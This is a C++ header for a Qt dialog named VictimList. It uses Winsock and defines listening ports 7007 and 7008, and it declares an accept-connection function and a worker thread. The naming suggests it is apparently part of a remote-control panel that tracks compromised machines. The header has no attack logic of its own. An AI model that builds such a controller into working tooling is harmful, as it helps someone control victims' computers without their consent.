#pragma once
#include"ui_VictimList.h"

#include<qdialog.h>
#include<qstringlistmodel.h>
#include<qabstractitemview.h>
#include<qstringlist.h>
#include<qmenu.h>
#include<qdebug.h>
#include<qmessagebox.h>
#include<qabstractitemmodel.h>
#include<WinSock2.h>
#include<windows.h>
#include<process.h>
#include<string>
#include<iterator>
#include<vector>
#include<algorithm>
#include<iostream>
#include<set>
#pragma comment(lib,"ws2_32.lib")

#define SIGNAL_PORT	7007
#define ACCEPT_PORT 7008

typedef struct vl_threadparam
{

	Ui::Vl_Dialog* ui;
	QStringListModel* model;
	QStringList* list;
}VL_THREAD_PARAM;

class VictimList : public QDialog
{

	Q_OBJECT

private:



public:
	
	Ui::Vl_Dialog* ui=Q_NULLPTR;
	
	VictimList(QWidget* parent = Q_NULLPTR);
	QStringListModel* model;
	virtual ~VictimList();

public slots:

	void CustomMenuSlots(QPoint);
	void context();

};
SOCKET Accept(SOCKET csock);
unsigned WINAPI VictimListfn(LPVOID v);